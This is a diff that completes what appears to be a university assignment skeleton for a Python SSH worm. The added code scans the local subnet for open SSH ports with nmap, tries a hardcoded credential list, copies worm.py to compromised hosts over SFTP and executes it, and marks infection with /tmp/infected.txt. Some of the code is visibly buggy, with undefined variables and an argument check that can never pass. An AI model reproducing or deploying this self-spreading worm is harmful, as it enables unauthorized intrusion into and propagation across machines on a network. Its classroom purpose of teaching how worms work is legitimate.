@@ -1,8 +1,8 @@
 import paramiko
 import sys
+import netinfo
 import socket
 import nmap
-import netinfo
 import os
 
 # The list of credentials to attempt
@@ -15,28 +15,28 @@ credList = [
 
 # The file marking whether the worm should spread
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
-
 ##################################################################
 # Returns whether the worm should spread
 # @return - True if the infection succeeded and false otherwise
 ##################################################################
 def isInfectedSystem():
-	# Check if the system as infected. One
-	# approach is to check for a file called
-	# infected.txt in directory /tmp (which
-	# you created when you marked the system
-	# as infected). 
-	pass
+    # Check if the system as infected. One
+    # approach is to check for a file called
+    # infected.txt in directory /tmp (which
+    # you created when you marked the system
+    # as infected).
+    is_infected = os.path.isfile("/tmp/infected.txt")
+    return is_infected
 
 #################################################################
 # Marks the system as infected
 #################################################################
 def markInfected():
-	
-	# Mark the system as infected. One way to do
-	# this is to create a file called infected.txt
-	# in directory /tmp/
-	pass	
+    # Mark the system as infected. One way to do
+    # this is to create a file called infected.txt
+    # in directory /tmp/
+    infected_file = open("/tmp/infected.txt", "w+")
+    infected_file.close()
 
 ###############################################################
 # Spread to the other system and execute
@@ -54,7 +54,11 @@ def spreadAndExecute(sshClient):
 	# execute itself. Please check out the
 	# code we used for an in-class exercise.
 	# The code which goes into this function
-	# is very similar to that code.	
+	# is very similar to that code.
+	sftpClient = sshClient.open_sftp()
+	sftpClient.put("worm.py", "worm.py")
+	sshClient.exec_command("chmod a+x worm.py")
+	sshClient.exec_command("./worm.py")
 	pass
 
 
@@ -90,6 +94,10 @@ def tryCredentials(host, userName, password, sshClient):
 	# in the comments above the function
 	# declaration (if you choose to use
 	# this skeleton).
+	connection_result = ssh.connect(host, userName = userName, password = password)
+	if not connection_result:
+		return 1
+	return 0
 	pass
 
 ###############################################################
@@ -109,10 +117,7 @@ def attackSystem(host):
 
 	# Set some parameters to make things easier.
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-	
-	# The results of an attempt
-	attemptResults = None
-				
+
 	# Go through the credentials
 	for (username, password) in credList:
 		
@@ -126,9 +131,10 @@ def attackSystem(host):
 		# victim. In this case we will
 		# return a tuple containing an
 		# instance of the SSH connection
-		# to the remote system. 
-		pass	
-			
+		# to the remote system.
+		attemptResults = tryCredentials(host, username, password, ssh)
+		if attemptResults:
+			return [ssh, username, password]
 	# Could not find working credentials
 	return None	
 
@@ -141,8 +147,8 @@ def attackSystem(host):
 def getMyIP(interface):
 	
 	# TODO: Change this to retrieve and
-	# return the IP of the current system.
-	return None
+	my_ip = netinfo.get_ip(interface)
+	return my_ip
 
 #######################################################
 # Returns the list of systems on the same network
@@ -153,8 +159,14 @@ def getHostsOnTheSameNetwork():
 	# TODO: Add code for scanning
 	# for hosts on the same network
 	# and return the list of discovered
-	# IP addresses.	
-	pass
+	# IP addresses.
+	interface_list = netinfo.list_devs()
+	portScanner = nmap.PortScanner()
+	portScanner.scan(getMyIP(interface_list[0]), arguments='-p 22 --open')
+	print interface_list
+	print getMyIP(interface_list[0])
+	hostInfo = portScanner.all_hosts()
+	return hostInfo
 
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
@@ -165,13 +177,17 @@ def getHostsOnTheSameNetwork():
 # an alternative approach is to hardcode the origin system's
 # IP address and have the worm check the IP of the current
 # system against the hardcoded IP. 
-if len(sys.argv) < 2:
+if len(sys.argv) < 1:
 	
 	# TODO: If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
-	# Otherwise, proceed with malice. 
-	pass
+	# Otherwise, proceed with malice.
+	if (os.path.isfile("/tmp/infected.txt")):
+		exit()
+
 # TODO: Get the IP of the current system
+interface = netinfo.list_devs()[0]
+myIp = getMyIP(interface)
 
 
 # Get the hosts on the same network
@@ -181,52 +197,56 @@ networkHosts = getHostsOnTheSameNetwork()
 # from the list of discovered systems (we
 # do not want to target ourselves!).
 
-print "Found hosts: ", networkHosts
+if networkHosts is not None:
+	for host in networkHosts:
+		if host == myIp:
+			networkHosts.remove(host)
+
+	print "Found hosts: ", networkHosts
 
 
 # Go through the network hosts
-for host in networkHosts:
-	
-	# Try to attack this host
-	sshInfo =  attackSystem(host)
-	
-	print sshInfo
-	
-	
-	# Did the attack succeed?
-	if sshInfo:
-		
-		print "Trying to spread"
-		
-		# TODO: Check if the system was	
-		# already infected. This can be
-		# done by checking whether the
-		# remote system contains /tmp/infected.txt
-		# file (which the worm will place there
-		# when it first infects the system)
-		# This can be done using code similar to
-		# the code below:
-		# try:
-        #	 remotepath = '/tmp/infected.txt'
-		#        localpath = '/home/cpsc/'
-		#	 # Copy the file from the specified
-		#	 # remote path to the specified
-		# 	 # local path. If the file does exist
-		#	 # at the remote path, then get()
-		# 	 # will throw IOError exception
-		# 	 # (that is, we know the system is
-		# 	 # not yet infected).
-		# 
-		#        sftp.get(filepath, localpath)
-		# except IOError:
-		#       print "This system should be infected"
-		#
-		#
-		# If the system was already infected proceed.
-		# Otherwise, infect the system and terminate.
-		# Infect that system
-		spreadAndExecute(sshInfo[0])
-		
-		print "Spreading complete"	
-	
+	for host in networkHosts:
+
+		# Try to attack this host
+		sshInfo =  attackSystem(host)
+
+		print sshInfo
+
+
+		# Did the attack succeed?
+		if sshInfo:
+
+			print "Trying to spread"
+
+			# TODO: Check if the system was
+			# already infected. This can be
+			# done by checking whether the
+			# remote system contains /tmp/infected.txt
+			# file (which the worm will place there
+			# when it first infects the system)
+			# This can be done using code similar to
+			# the code below:
+			try:
+				remotepath = '/tmp/infected.txt'
+				localpath = '/home/cpsc/'
+			#	 # Copy the file from the specified
+			#	 # remote path to the specified
+			# 	 # local path. If the file does exist
+			#	 # at the remote path, then get()
+			# 	 # will throw IOError exception
+			# 	 # (that is, we know the system is
+			# 	 # not yet infected).
+				sftp.get(filepath, localpath)
+			except IOError:
+				print "This system should be infected"
+			#
+			#
+			# If the system was already infected proceed.
+			# Otherwise, infect the system and terminate.
+			# Infect that system
+			spreadAndExecute(sshInfo[0])
+
+			print "Spreading complete"
+
 
